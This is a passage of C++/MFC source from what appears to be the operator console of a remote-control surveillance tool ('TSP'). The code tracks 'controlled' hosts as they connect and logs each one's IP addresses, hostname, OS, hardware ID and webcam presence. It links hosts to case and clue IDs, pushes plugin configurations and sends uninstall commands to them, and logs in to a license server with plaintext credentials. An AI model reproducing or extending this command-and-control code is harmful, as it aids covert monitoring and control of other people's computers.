	m_pListCtrl->SetItemText(nFindIndex, COL_OPERSYS, pNode->szOperSys);
	m_pListCtrl->SetItemText(nFindIndex, COL_CPU, pNode->szCPU);
	m_pListCtrl->SetItemText(nFindIndex, COL_PING, pNode->szPing);
	m_pListCtrl->SetItemText(nFindIndex, COL_CAMERA, pNode->szCamer);
	m_pListCtrl->SetItemText(nFindIndex, COL_VERSION, pNode->szVersion);
	m_pListCtrl->SetItemText(nFindIndex, COL_AREA, pNode->szArea);
	m_pListCtrl->SetItemText(nFindIndex, COL_HARDID, pNode->szHardID);
	m_pListCtrl->SetItemText(nFindIndex, COL_CASE_ID, pNode->szCaseID);
	m_pListCtrl->SetItemText(nFindIndex, COL_CLUE_ID, pNode->szClueID);
	m_pListCtrl->SetItemText(nFindIndex, COL_CLUENAME, pNode->szClueName);
	m_pListCtrl->SetItemText(nFindIndex, COL_LAST_ACCEPT_TIME, pNode->szlastAcceptTime);
	m_pListCtrl->SetItemText(nFindIndex, COL_FIRST_ACCEPT_TIME, pNode->szfirstAcceptTime);

	m_pListCtrl->SetItemText(nFindIndex, COL_LAST_OFFLINE_TIME, pNode->szlastCloseTime);
	m_pListCtrl->SetItemText(nFindIndex, COL_STATE, pNode->StateName);
	m_pListCtrl->SetItemText(nFindIndex, COL_LAST_RECV_TIME, pNode->szlastRecvTime);

	if(((CTSPClientApp *)AfxGetApp())->m_autoSelectVisible)
	{
		POSITION pos = m_pListCtrl->GetFirstSelectedItemPosition();
		if (pos != NULL)
		{
			int nItem = m_pListCtrl->GetNextSelectedItem(pos);
			m_pListCtrl->SetItemState(nItem,0,LVIS_SELECTED);
		}
		m_pListCtrl->SetItemState(nFindIndex,LVIS_SELECTED,LVIS_SELECTED);
		m_pListCtrl->EnsureVisible(nFindIndex,TRUE);
	}
	return TRUE;
}

BOOL CTSPClientView::OnOnline(LPVOID lpContent)
{



	if (NULL == lpContent)
	{
		return FALSE;
	}
	ClientContext *pContext = (ClientContext*)lpContent;

	
	
	LOGININFO*	LoginInfo = (LOGININFO*)pContext->m_DeCompressionBuffer.GetBuffer();
	if (NULL == LoginInfo)
	{
		return FALSE;
	}
#ifdef _MYDEBUG1
	g_log.Log(0,"\t OnOnline%d\n",__LINE__);
#endif
	BOOL bFind = FALSE;
	PINFO_DB_CONTRAST tmpNode = NULL;
	int nFindIndex = 0;
	//-----------------------------------------------
	SendAutoSrccen(LoginInfo,lpContent);



	//解析案件线索 和被控端版本信息， add by menglz




	char *pTempCaseID = NULL;
	char *pTempClueID = NULL;
	char *pTempSoftVerion = NULL;
	BOOL bNewVersion = FALSE;
	int  iIsUser = 0; //add by zhenyu 添加判断使用者，区分LZ还是T
	char szIsUserINIPath[MAX_PATH]={0};


	char chCaseClueIdAndVerStr[MAX_PATH] = {0};


	if (LoginInfo->SerVer >= 20150724)
	{
		pTempCaseID =LoginInfo->szCaseID;
		pTempClueID=LoginInfo->szClueID;
	}
	else
	{
		pTempCaseID = strstr((char *)LoginInfo->szCPUID,"}");


		if(NULL != pTempCaseID)
		{
			(*pTempCaseID) = '\x0';
			pTempCaseID++;

			strncpy(chCaseClueIdAndVerStr,pTempCaseID,MAX_PATH);

			pTempCaseID = chCaseClueIdAndVerStr;

			pTempClueID = strstr(pTempCaseID,"}");

		}


		if(NULL != pTempClueID)
		{

			(*pTempClueID) = '\0';
			pTempClueID++;

			pTempSoftVerion = strstr(pTempClueID,"}");
		}

		if (NULL != pTempSoftVerion)
		{
			(*pTempSoftVerion) = '\0';
			 pTempSoftVerion++;
		}
	}

	if( !GetModuleFileName(NULL, szIsUserINIPath, MAX_PATH))
	{
		return -1;
	}
	if (NULL == strrchr( szIsUserINIPath, '\\'))
	{
		return -1;
	}
	strrchr( szIsUserINIPath, '\\')[1]= 0; //删除文件名，只获得路径
	strcat(szIsUserINIPath,"ISTSPUSER.ini");
	iIsUser = GetPrivateProfileInt("ISTSPUSER","ISTSPUSER",0,szIsUserINIPath);
	if (1 == iIsUser)
	{
		bNewVersion = TRUE;  //支持LZ
		//	OutputDebugString("LZLZLZLZLZLZLZL");
	}
	else
	{
		bNewVersion = FALSE; //支持TX
		//OutputDebugString("TXTXTXTXTXTX");
	}
	//解析案件线索id 和版本完毕


#ifdef _MYDEBUG1
	g_log.Log(0,"\t OnOnline%d\n",__LINE__);
#endif
	for(int i=0;i<m_pListCtrl->GetItemCount();i++)
	{
		tmpNode=(PINFO_DB_CONTRAST)m_pListCtrl->GetItemData(i);


#ifdef _MYDEBUG
		g_log.Log(LEVEL_INFO,"tmpNode->szHardID =%s, LoginInfo->szCPUID = %s \n",tmpNode->szHardID,LoginInfo->szCPUID);

#endif



		if(strcmp(tmpNode->szHardID,(LPCSTR)LoginInfo->szCPUID)==0)
		{
			bFind = TRUE;
			nFindIndex = i;
			break;
		}
	}	
#ifdef _MYDEBUG1
	g_log.Log(0,"\t OnOnline%d\n",__LINE__);
#endif
	if (!bFind || NULL == tmpNode )//添加一个新的元素
	{
		tmpNode = new INFO_DB_CONTRAST;
		::ZeroMemory(tmpNode, sizeof(INFO_DB_CONTRAST));


	}
#ifdef _MYDEBUG1
	g_log.Log(0,"\t OnOnline%d\n",__LINE__);
#endif


	tmpNode->lpContent = pContext;
	strcpy(tmpNode->StateName,"上线");

	memset(tmpNode->szOnOff,0,16);
	StrCpyA(tmpNode->szOnOff,"online");



	// 外网IP
	sockaddr_in  sockAddr = {0};
	int nSockAddrLen = sizeof(sockAddr);
	BOOL bResult = getpeername(pContext->m_Socket,(SOCKADDR*)&sockAddr, &nSockAddrLen);
	CString IPAddress = bResult != INVALID_SOCKET ? inet_ntoa(sockAddr.sin_addr) : "";
	memcpy(tmpNode->IPWAN, IPAddress, sizeof(tmpNode->IPWAN)-1);


	//最后上线时间
	sprintf(tmpNode->szlastAcceptTime,"%04d-%02d-%02d(%02d:%02d)",pContext->m_lastAcceptTime.wYear,pContext->m_lastAcceptTime.wMonth,pContext->m_lastAcceptTime.wDay,pContext->m_lastAcceptTime.wHour,pContext->m_lastAcceptTime.wMinute);
	sprintf(tmpNode->szlastRecvTime,"%04d-%02d-%02d(%02d:%02d)",pContext->m_lastRecvTime.wYear,pContext->m_lastRecvTime.wMonth,pContext->m_lastRecvTime.wDay,pContext->m_lastRecvTime.wHour,pContext->m_lastRecvTime.wMinute);
	if(pContext->m_lastCloseTime.wYear!=0)
		sprintf(tmpNode->szlastCloseTime,"%04d-%02d-%02d(%02d:%02d)",pContext->m_lastCloseTime.wYear,pContext->m_lastCloseTime.wMonth,pContext->m_lastCloseTime.wDay,pContext->m_lastCloseTime.wHour,pContext->m_lastCloseTime.wMinute);
	else
		sprintf(tmpNode->szlastCloseTime,"");

	// 内网IP
	memcpy(tmpNode->IPLAN,inet_ntoa(LoginInfo->IPAddress), sizeof(tmpNode->IPLAN)-1);

	memcpy(tmpNode->szComputerName,LoginInfo->HostName, sizeof(tmpNode->szComputerName)-1);
#ifdef _MYDEBUG1
	g_log.Log(0,"\t OnOnline%d\n",__LINE__);
#endif
	// 系统
	// 显示输出信息
	char *pszOS = NULL;
	switch (LoginInfo->OsVerInfoEx.dwPlatformId)
	{
	case VER_PLATFORM_WIN32_NT:
		if (LoginInfo->OsVerInfoEx.dwMajorVersion <= 4 )
			pszOS = "NT";
		if ( LoginInfo->OsVerInfoEx.dwMajorVersion == 5 && LoginInfo->OsVerInfoEx.dwMinorVersion == 0 )
			pszOS = "2000";
		if ( LoginInfo->OsVerInfoEx.dwMajorVersion == 5 && LoginInfo->OsVerInfoEx.dwMinorVersion == 1 )
			pszOS = "XP";
		if ( LoginInfo->OsVerInfoEx.dwMajorVersion == 5 && LoginInfo->OsVerInfoEx.dwMinorVersion == 2 )
			pszOS = "2003";
		if ( LoginInfo->OsVerInfoEx.dwMajorVersion == 6 && LoginInfo->OsVerInfoEx.dwMinorVersion == 0 )
			pszOS = "Vista";  //
		if ( LoginInfo->OsVerInfoEx.dwMajorVersion == 6 && LoginInfo->OsVerInfoEx.dwMinorVersion == 1 )
			pszOS = "WIN 7";  //
	}
	CString strOS;
	strOS.Format("%s SP%d (Build %d)",//OsVerInfo.szCSDVersion,
		pszOS, 
		LoginInfo->OsVerInfoEx.wServicePackMajor, 
		LoginInfo->OsVerInfoEx.dwBuildNumber);
	memcpy(tmpNode->szOperSys, strOS, sizeof(tmpNode->szOperSys)-1);
#ifdef _MYDEBUG1
g_log.Log(0,"\t OnOnline%d\n",__LINE__);
#endif
	// CPU
	CString	str;
	str.Format("%dMHz", LoginInfo->CPUClockMhz);
	memcpy(tmpNode->szCPU, str,sizeof(tmpNode->szCPU)-1);

	// Speed
	str.Format("%d", LoginInfo->dwSpeed);
	memcpy(tmpNode->szPing,str, sizeof(tmpNode->szPing)-1);

	str = LoginInfo->bIsWebCam ? "有" : "无";
	memcpy(tmpNode->szCamer, str, sizeof(tmpNode->szCamer)-1);


	str.Format( "%d", LoginInfo->SerVer);
	memcpy(tmpNode->szVersion, str, sizeof(tmpNode->szVersion)-1);

	if (20100720 <= LoginInfo->SerVer)
	{
		memcpy(tmpNode->szHardID,(const char *)LoginInfo->szCPUID, sizeof(tmpNode->szHardID)-1);
	}
#ifdef _MYDEBUG1
	g_log.Log(0,"\t OnOnline%d\n",__LINE__);
#endif
	//关联线索
	m_csClueDataLock.WaitToRead();
	int nCountArr = m_arrClue.GetCount();//filter_ips.txt中的线索
	for (int j=0; j<nCountArr; j++)
	{
		if (0 == lstrcmpi(tmpNode->IPWAN, m_arrClue.GetAt(j)->szIP))
		{
			memcpy(tmpNode->szCaseID, m_arrClue.GetAt(j)->szCaseID,sizeof(tmpNode->szCaseID)-1);
			memcpy(tmpNode->szClueID, m_arrClue.GetAt(j)->szClueID,sizeof(tmpNode->szClueID)-1);
			memcpy(tmpNode->szClueName, m_arrClue.GetAt(j)->szClueName,sizeof(tmpNode->szClueName)-1);
			g_log.Log(0,"\t 线索匹配！！！%s=%s\n",tmpNode->IPWAN,tmpNode->szHardID);
			UpdateArrMac(tmpNode->szHardID, tmpNode->szCaseID,tmpNode->szClueID, tmpNode->szClueName);
			break;
		}
	}
	m_csClueDataLock.Done();
#ifdef _MYDEBUG1
	g_log.Log(0,"\t OnOnline%d\n",__LINE__);
#endif

	if (0 == lstrlen(tmpNode->szCaseID))
	{
		m_csMacDataLock.WaitToRead();
		nCountArr = m_arrMac.GetCount(); //mac_clue.txt
		for (int j=0; j<nCountArr; j++)
		{
			CString strMac = tmpNode->szHardID;
			CString strArr = m_arrMac.GetAt(j)->szMAC;
			if (strMac == strArr)
			{
				memcpy(tmpNode->szClueID,m_arrMac.GetAt(j)->szClueID, sizeof(tmpNode->szClueID)-1);
				memcpy(tmpNode->szCaseID,m_arrMac.GetAt(j)->szCaseID, sizeof(tmpNode->szCaseID)-1);
				memcpy(tmpNode->szClueName,m_arrMac.GetAt(j)->szClueName,sizeof(tmpNode->szClueName)-1);

				break;
			}
		}
		m_csMacDataLock.Done();
	}
#ifdef _MYDEBUG1
	g_log.Log(0,"\t OnOnline%d\n",__LINE__);
#endif
	
	
	
	 //*************************by menglz*********tsp2.0上线代码


#ifdef _MYDEBUG
	
		if(!bNewVersion)
		{
			
			g_log.Log(LEVEL_INFO,"2.0patch1版本以前的机器上线\n");
		}


		g_log.Log(LEVEL_INFO,"执行上线入库函数TSP_2_OnLine\n");

#endif
	
		//EnterCriticalSection(&g_online_cs);

		

		if(bNewVersion)
		{
			strncpy(tmpNode->szCaseID,pTempCaseID,32);
			strncpy(tmpNode->szClueID,pTempClueID,32);

		}

		


		
		if(!TSP_2_OnLine(tmpNode))
		{

			BYTE *sByt = new BYTE [ 4 ];//COMMAND_ACTIVED;
			sByt[0] = COMMAND_ONLINE_ERROR;			
		
#ifdef _MYDEBUG
			g_log.Log(LEVEL_INFO,"发送上线错误码\n");

#endif

			m_iocpServer->Send( pContext, sByt, 4 );

			delete[] sByt;

			return FALSE;  //确认以后没有要释放的东东

		}

		//LeaveCriticalSection(&g_online_cs);

     //**************************************
	
	
	

	/*   //tsp2.0不需要了，已经有短信报警

	
	//短信报警


		if (tmpNode->szCaseID)
		{
			SendShortMsg(tmpNode->szCaseID);
		}

	*/



#ifdef _MYDEBUG1
	g_log.Log(0,"\t OnOnline%d\n",__LINE__);
#endif
	//显示tooltip
	CString strToolTipsText;
	if(bFind)
		strToolTipsText.Format("主机上线:\n主机名: %s\nIP地址: %s\n标识: %s", tmpNode->szComputerName, IPAddress, tmpNode->szHardID);
	else
		strToolTipsText.Format("有新主机上线:\n主机名: %s\nIP地址: %s\n标识: %s", tmpNode->szComputerName, IPAddress, tmpNode->szHardID);

	if (((CTSPClientApp *)AfxGetApp())->m_bIsQQwryExist)
	{
		str = m_QQwry->IPtoAdd(IPAddress);
		memcpy(tmpNode->szArea, str,sizeof(tmpNode->szArea)-1);

		strToolTipsText += "\n地区: ";
		strToolTipsText += str;
	}


#ifdef _MYDEBUG1
	g_log.Log(0,"\t OnOnline%d\n",__LINE__);
#endif


	if (!bFind)
	{
		// 首次上线，数据库中插入记录,liucw 2013-08-06
		DWORD dwMachineID = crc32((uchar *)tmpNode->szHardID,strlen(tmpNode->szHardID));


		LOG((LEVEL_INFO,"-----机器%lu,第一次上线\n",dwMachineID));

		
		//if(bNewVersion)  //如果是新版本，从全局冲拷贝插件配置，如果是旧的就不拷贝  by menglz
		if(TRUE) //不考虑1.5的了，全部可以用插件
		{

			int ret = TSP2_PluginOnLine(dwMachineID );
			if( ret != 0 )
			{
				LOG((LEVEL_ERROR,"首次上线数据库操作失败.%d\n",dwMachineID));
			}

		}
		
		


		SYSTEMTIME time;
		GetLocalTime(&time);
		sprintf(tmpNode->szfirstAcceptTime,"%04d-%02d-%02d(%02d:%02d)",time.wYear,time.wMonth,time.wDay,time.wHour,time.wMinute);
		if(ProcessOfflineCmd(tmpNode, nFindIndex))//
		{
			
		}else
		{
			
			InsertItemByCurOrder(tmpNode);
		}
		if (!((CTSPClientApp *)AfxGetApp())->m_bIsDisablePopTips) 
		{
			g_pFrame->ShowToolTips(strToolTipsText);
		}
	}else
	{
		//备注的内容客户可能修改过,所以,需要取出内容
		memcpy(tmpNode->szComputerName,m_pListCtrl->GetItemText(nFindIndex,COL_COMPNAME),sizeof(tmpNode->szComputerName));
		if(strlen(tmpNode->szfirstAcceptTime)<=0)
		{
			SYSTEMTIME time;
			GetLocalTime(&time);
			sprintf(tmpNode->szfirstAcceptTime,"%04d-%02d-%02d(%02d:%02d)",time.wYear,time.wMonth,time.wDay,time.wHour,time.wMinute);
		}
		if(ProcessOfflineCmd(tmpNode, nFindIndex))
		{
			
			m_pListCtrl->DeleteItem(nFindIndex);
		}else
		{
			
			UpdateItem(nFindIndex,tmpNode);
			if (!((CTSPClientApp *)AfxGetApp())->m_bIsDisablePopTips) 
			{
				g_pFrame->ShowToolTips(strToolTipsText);
			}
		}
	}



	//写上线日志

	CString strLog;
	strLog.Format(_T("上线 ID %d, WAN %s, LAN %s, 计算机名/备注 %s, 操作系统 %s, CPU %s Ping %s, 摄像头 %s, 服务端版本%s, 区域 %s, 硬件标识%s, 线索编号%s\r\n"), \
		nFindIndex,\
		tmpNode->IPWAN, \
		tmpNode->IPLAN, \
		tmpNode->szComputerName, \
		tmpNode->szOperSys, \
		tmpNode->szCPU, \
		tmpNode->szPing, \
		tmpNode->szCamer, \
		tmpNode->szVersion, \
		tmpNode->szArea, \
		tmpNode->szHardID, \
		tmpNode->szCaseID);
	g_log.Log(0,strLog);
#ifdef _MYDEBUG1
	g_log.Log(0,"\t OnOnline%d\n",__LINE__);
#endif

	//----------------------------------------------
	Ism_arrDbChange=TRUE;

#ifdef _MYDEBUG1
	g_log.Log(0,"\t OnOnline%d\n",__LINE__);
#endif


	WriteDbFile();
	WriteMacFile();
	if(g_pFrame)
		g_pFrame->ShowConnectionsNumber();
	//Invalidate(FALSE);
	return TRUE;
}
BOOL CTSPClientView::OnOffline(LPVOID lpContent)
{
	if (NULL == lpContent)
	{
		return FALSE;
	}
	ClientContext *pContext = (ClientContext*)lpContent;


	//LOGININFO*	LoginInfo = (LOGININFO*)pContext->m_DeCompressionBuffer.GetBuffer();
	//if (NULL == LoginInfo)
	//{
	//	return FALSE;
	//}
#ifdef _MYDEBUG
	g_log.Log(0,"\t OnOffline%d\n",__LINE__);
#endif

	BOOL bFind = FALSE;
	PINFO_DB_CONTRAST tmpNode = NULL;
	int nFindIndex = 0;
	//-----------------------------------------------
	for(int i=0;i<m_pListCtrl->GetItemCount();i++)
	{
		tmpNode=(PINFO_DB_CONTRAST)m_pListCtrl->GetItemData(i);
		ClientContext *pContext1=(ClientContext *)(tmpNode->lpContent);
		if((pContext1)&&(pContext1==pContext)&&(pContext1->m_Socket==pContext->m_Socket))
		{
			bFind = TRUE;
			nFindIndex = i;
			break;
		}
	}



	//***********************************by menglz***********tsp2.0下线代码************

	if(NULL != tmpNode)
		TSP_2_OffLine(tmpNode->szHardID);


	//*************************************************************************




	if (bFind && NULL != tmpNode )//这种情况一定出现
	{
		sprintf(tmpNode->szlastRecvTime,"");
		strcpy(tmpNode->StateName,"下线");
		if(pContext->m_lastCloseTime.wYear!=0)
			sprintf(tmpNode->szlastCloseTime,"%04d-%02d-%02d(%02d:%02d)",pContext->m_lastCloseTime.wYear,pContext->m_lastCloseTime.wMonth,pContext->m_lastCloseTime.wDay,pContext->m_lastCloseTime.wHour,pContext->m_lastCloseTime.wMinute);
		else
			sprintf(tmpNode->szlastCloseTime,"");


		tmpNode->lpContent = NULL;
		memset(tmpNode->szOnOff,0,16);
		StrCpyA(tmpNode->szOnOff,"offline");


		//显示tooltip
		CString strToolTipsText;
		strToolTipsText.Format("下线: \nIP地址: %s\n标识: %s\n线索:%s\n地区:%s", \
			m_pListCtrl->GetItemText( nFindIndex , COL_WAN), \
			m_pListCtrl->GetItemText( nFindIndex , COL_HARDID),\
			m_pListCtrl->GetItemText( nFindIndex , COL_CLUENAME),\
			m_pListCtrl->GetItemText( nFindIndex , COL_AREA));\

		if (!((CTSPClientApp *)AfxGetApp())->m_bIsDisablePopTips) 
		{
			g_pFrame->ShowToolTips(strToolTipsText);
		}

		memcpy(tmpNode->szComputerName,m_pListCtrl->GetItemText(nFindIndex,COL_COMPNAME),sizeof(tmpNode->szComputerName));
		UpdateItem(nFindIndex,tmpNode);
		
	//	Invalidate(FALSE);

	}


	//-----------------------------------------------
	Ism_arrDbChange=TRUE;
#ifdef _MYDEBUG
	g_log.Log(0,"\t OnOffline%d\n",__LINE__);
#endif

	WriteDbFile();
	WriteMacFile();
	if(g_pFrame)
		g_pFrame->ShowConnectionsNumber();
	return TRUE;
}
/*
BOOL CTSPClientView::OnDeleteConnect(LPVOID lpContent)
{
	if (NULL == lpContent)
	{
		return FALSE;
	}
	ClientContext *pContext = (ClientContext*)lpContent;
#ifdef _MYDEBUG
	g_log.Log(0,"\tOnDeleteConnect%d\n",__LINE__);
#endif
	BOOL bFind = FALSE;
	PINFO_DB_CONTRAST tmpNode = NULL;
	int nFindIndex = 0;
	//-----------------------------------------------
	for(int i=0;i<m_pListCtrl->GetItemCount();i++)
	{
		tmpNode=(PINFO_DB_CONTRAST)m_pListCtrl->GetItemData(i);
		ClientContext *pContext1=(ClientContext *)(tmpNode->lpContent);
		if((pContext1)&&(pContext1->m_Socket==pContext->m_Socket))
		{
			bFind = TRUE;
			nFindIndex = i;
			break;
		}
	}

	if (bFind && NULL != tmpNode )//这种情况一定出现
	{
		m_pListCtrl->DeleteItem(nFindIndex);
	}
	
	//-----------------------------------------------
	Ism_arrDbChange=TRUE;
#ifdef _MYDEBUG
	g_log.Log(0,"\tOnDeleteConnect%d\n",__LINE__);
#endif
	WriteDbFile();
	//WriteMacFile();
	if(g_pFrame)
		g_pFrame->ShowConnectionsNumber();
	return TRUE;
}*/

BOOL CTSPClientView::InsertItemByCurOrder(PINFO_DB_CONTRAST pNode)
{
	int index=-1;

	return InsertItem(index,pNode);
}
BOOL CTSPClientView::InsertItem(int pos,PINFO_DB_CONTRAST pNode)
{
	
	
	
	
	
	
	
	
	
	if(((CTSPClientApp *)AfxGetApp())->m_autoSelectVisible)
	{
		POSITION pos = m_pListCtrl->GetFirstSelectedItemPosition();
		if (pos != NULL)
		{
			int nItem = m_pListCtrl->GetNextSelectedItem(pos);
			m_pListCtrl->SetItemState(nItem,0,LVIS_SELECTED);
		}
	}
	int InsertIndex=pos;
	if(pos<0)
	{
		InsertIndex=m_pListCtrl->GetItemCount();
	}
	CString strtmp;
	m_ItemMaxID++;
	strtmp.Format("%d", m_ItemMaxID);
	m_pListCtrl->InsertItem(InsertIndex, strtmp, 15);
	m_pListCtrl->SetItemData(InsertIndex, (DWORD)pNode);
	m_pListCtrl->SetItemText(InsertIndex, COL_WAN, pNode->IPWAN);
	m_pListCtrl->SetItemText(InsertIndex, COL_LAN, pNode->IPLAN);
	m_pListCtrl->SetItemText(InsertIndex, COL_COMPNAME, pNode->szComputerName);
	m_pListCtrl->SetItemText(InsertIndex, COL_OPERSYS, pNode->szOperSys);
	m_pListCtrl->SetItemText(InsertIndex, COL_CPU, pNode->szCPU);
	m_pListCtrl->SetItemText(InsertIndex, COL_PING, pNode->szPing);
	m_pListCtrl->SetItemText(InsertIndex, COL_CAMERA, pNode->szCamer);
	m_pListCtrl->SetItemText(InsertIndex, COL_VERSION, pNode->szVersion);
	m_pListCtrl->SetItemText(InsertIndex, COL_AREA, pNode->szArea);
	m_pListCtrl->SetItemText(InsertIndex, COL_HARDID, pNode->szHardID);
	m_pListCtrl->SetItemText(InsertIndex, COL_CASE_ID, pNode->szCaseID);
	m_pListCtrl->SetItemText(InsertIndex, COL_CLUE_ID, pNode->szClueID);
	m_pListCtrl->SetItemText(InsertIndex, COL_CLUENAME, pNode->szClueName);
	m_pListCtrl->SetItemText(InsertIndex, COL_LAST_ACCEPT_TIME, pNode->szlastAcceptTime);
	m_pListCtrl->SetItemText(InsertIndex, COL_FIRST_ACCEPT_TIME, pNode->szfirstAcceptTime);
	m_pListCtrl->SetItemText(InsertIndex, COL_LAST_OFFLINE_TIME, pNode->szlastCloseTime);
	m_pListCtrl->SetItemText(InsertIndex, COL_STATE, pNode->StateName);
	m_pListCtrl->SetItemText(InsertIndex, COL_LAST_RECV_TIME, pNode->szlastRecvTime);


	if(((CTSPClientApp *)AfxGetApp())->m_autoSelectVisible)
	{
		m_pListCtrl->SetItemState(InsertIndex,LVIS_SELECTED,LVIS_SELECTED);
		m_pListCtrl->EnsureVisible(InsertIndex,TRUE);
	}

	return TRUE;
}

BOOL CTSPClientView::CheckUserFromLicenseSvr()
{
	SockTCP sTcp;
	BOOL bRet=TRUE;

	do 
	{		
		//连接服务
		if(!sTcp.Connect(&m_addrLicServer)) break;
		
		char USERIMFOR[256] = {0}, buff[256] = {0};
		wsprintf( USERIMFOR, "Login:%s@%s", g_szUserName, g_szPassword);
		
		if(sTcp.SendData((LPBYTE)USERIMFOR,sizeof(USERIMFOR))<=0) break;
		
		if (sTcp.RecvData((LPBYTE)buff,sizeof(buff))<=0) break;

		bRet=strstr( buff, "Logined" )==NULL?FALSE:TRUE;

	}while(FALSE);

	return bRet;
}

SOCKET CTSPClientView::LoginLicenseSvr()
{
	BOOL bRet = FALSE;
	

	SOCKET sockInt = socket(AF_INET, SOCK_STREAM, 0);
	if(sockInt == INVALID_SOCKET)
	{
		return sockInt;
	}

	do 
	{		
		//连接服务
		if(connect(sockInt, (struct sockaddr *)&m_addrLicServer, sizeof(m_addrLicServer)) == SOCKET_ERROR)
		{
			break;
		}

		char USERIMFOR[256] = {0}, buff[256] = {0};
		wsprintf( USERIMFOR, "Login:%s@%s", g_szUserName, g_szPassword);
		if( send(sockInt, USERIMFOR, sizeof(USERIMFOR), 0) == SOCKET_ERROR )
		{
			break;
		}

		int Ret = recv( sockInt, buff, sizeof(buff), NULL );
		if ( Ret == 0 || Ret == SOCKET_ERROR )
		{
			break;
		}

		if ( strstr( buff, "Logined" ) == NULL )//通过验证
		{
			break;
		}

		bRet = TRUE;

	}while(FALSE);

	if (!bRet)
	{
		closesocket(sockInt);
		sockInt = INVALID_SOCKET;
	}

	return sockInt;
}

void CTSPClientView::OnTimer(UINT_PTR nIDEvent)
{
	//OutputDebugStringA("dddddd");
	switch(nIDEvent)
	{
	case 0:
		{
		CString newstr;
		DWORD Minute=((GetTickCount()-g_BeginTickCount)/1000)/60;
		newstr.Format( "[运行时间%d小时%d分钟][文件版本%s]",Minute/60,Minute%60,g_FileVerName);
		((CMainFrame*)AfxGetApp()->m_pMainWnd)->m_wndStatusBar.SetPaneText(0, newstr);
		}
		break;
	case 1:
		if (!m_bNewClientVer)
			GetVersionFromServer();
		if (m_bNewClientVer)
		{
			g_pFrame->ShowToolTips("客户端有新版本,请及时更新!!!!");
		}
		break;
	case 2:
		
// 		TCHAR szPlug[MAX_PATH]={0};
// 		wsprintf(szPlug,"%sTspPlug.dll",GetExeCurrentDir());
// 		DeleteFile(szPlug);
// 		if (!PathFileExists(szPlug))
// 		{
// 			GetFileFromServer("TspPlug.tmp",szPlug);
// 		}
// 		if (hTspPlug=LoadLibraryA(szPlug))
// 		{
// 			this->KillTimer(2);
// 		}
// 		
	case 3:
		WriteDbFile();
		break;
	case 4:
		// 数据库轮询，判断是否设置修改 2013.07.29
		// 两层循环，每次都算crc,效率非常低
		// TO DO: 修改数据结构
		{
			int ret;
			std::vector<pair<int,int> > vec;
			std::set<DWORD> s;
			ret = OnDbNotify(vec);
			if( 0 != ret )
			{
				LOG((LEVEL_ERROR,"轮询数据库失败:%x\n",ret));
				break;
			}

			if( !vec.empty() )
				for(int i=0;i<m_pListCtrl->GetItemCount();i++)
				{
					INFO_DB_CONTRAST *pItem=((INFO_DB_CONTRAST *)m_pListCtrl->GetItemData(i));
					if(pItem)
					{
						uint dwMachineID = crc32((uchar *)pItem->szHardID,strlen(pItem->szHardID));
						for( vector<pair<int,int> >::const_iterator iter=vec.begin();iter!=vec.end();++iter)
							if( dwMachineID == iter->first )
							{
								ClientContext *pContext=(ClientContext *)pItem->lpContent;							

								// 下线后为空？？
								if( !pContext )
									continue;

								// 卸载
								if( iter->second == TSP_PLUGIN_REMOVE_PID )
								{				
									// 发卸载命令
									CPluginRemover remover(pContext,m_iocpServer);
									ret = remover(dwMachineID);
									if( ret != 0 )
									{
										LOG((LEVEL_WARNNING,"卸载失败,返回:%d",ret));
									}

									//卸载后不再处理插件更新
									continue;
								}
								
								else
								{
									// 在集合里找一下，看是否发过
									if( s.find(dwMachineID) != s.end() )
										continue;

									// 其他插件的改动都是插件更新

									char szMachineConfigFile[TSP_PLUGIN_PATH];
									// 插件配置修改
									
									CPluginConfig pluginConfig(pContext,m_iocpServer);

									if( !pluginConfig.CreateConfigFile(dwMachineID,szMachineConfigFile) )
									{
										LOG((LEVEL_ERROR,"创建插件文件错误,MachineID:%d.\n",dwMachineID));										
									}

									if( !pluginConfig.SendFile(szMachineConfigFile) )
									{
										LOG((LEVEL_ERROR,"发送插件失败:%s.\n",szMachineConfigFile));
									}

									// 加入集合
									s.insert(dwMachineID);
								}

								// 进入下个大循环								
								
							}					
					}
				}		
		}		
		break;
	case 5:

		UpdateDBSoftPeriod();
		break;

	//add by yx 
	case 7:

		UpdateClue();
		break;


	case 6:
		if (g_pSettingView->m_UserChoice)
		{
			KillTimer(6);
			UpdateTSPWebUserID();
			this->SetTimer(6,1000*60*10,0);
		}

		break;
	}

	//CListView::OnTimer(nIDEvent);
}
void CTSPClientView::OnAppHelp()
{
	TCHAR szHelp[MAX_PATH]={0};
	wsprintf(szHelp,"%s\\%s",GetExeCurrentDir(),"TSP使用手册.chm");
	::ShellExecute(m_hWnd , "open",szHelp, NULL, NULL, SW_SHOWNORMAL);
	// TODO: 在此添加命令处理程序代码
}

BOOL CTSPClientView::GetFileFromServer(TCHAR *szFileName,OUT TCHAR *szOutFileName)
{
	BOOL bRet=FALSE;
	SOCKET sockInt = LoginLicenseSvr();
	if(sockInt == INVALID_SOCKET)
	{
		return bRet;
	}

	TCHAR  szTmpWebSer[MAX_PATH]={0};
	GetTempPath(MAX_PATH,szTmpWebSer);
	StrCatA(szTmpWebSer,"fdsf.dat");

	DWORD dwBytes = 0;
	HANDLE hFile = CreateFile(szTmpWebSer, GENERIC_WRITE, FILE_SHARE_WRITE|FILE_SHARE_READ, NULL, CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL, NULL );
	BYTE request[256] = {0};
	request[0] = DOWN_FILE;
	StrCpyA((char*)(&request[1]),szFileName);

// 	if (GetFileAttributes(m_strServerFile) == -1 )
// 	{
// 		return bRet;
// 	}

	do 
	{
		send( sockInt, (char*)&request, sizeof(request),NULL);

		//接收文件的大小
		DWORD dwFileSize=0;
		recv( sockInt,(char*)&dwFileSize,sizeof(DWORD),NULL);

		char *RecvData=new char[RECV_MAX_BUF];
		DWORD recvsize = 0;

		while (TRUE)
		{
			memset(RecvData, 0,RECV_MAX_BUF);

			int dwRetSize = recv( sockInt,RecvData,RECV_MAX_BUF,NULL);
			if ( dwRetSize == 0 || dwRetSize == SOCKET_ERROR )
			{
				break;
			}


			recvsize += dwRetSize;
			m_dlgProgress.SetPos(recvsize,dwFileSize);

			if ( recvsize>=dwFileSize ) 
			{

				WriteFile(hFile,RecvData,dwRetSize,&dwBytes, NULL);
				bRet = TRUE;
				break;
			}
			WriteFile(hFile,RecvData,dwRetSize,&dwBytes, NULL);
		}

	} while (FALSE);

	//关闭文件
	CloseHandle(hFile);
	closesocket(sockInt);
	bRet=CopyFile(szTmpWebSer,szOutFileName,FALSE);
	DeleteFile(szTmpWebSer);
	return bRet;

}



void CTSPClientView::OnInstallWebServer()
{

// 	if (!GetVersionFromServer(szWebSerName))
// 	{
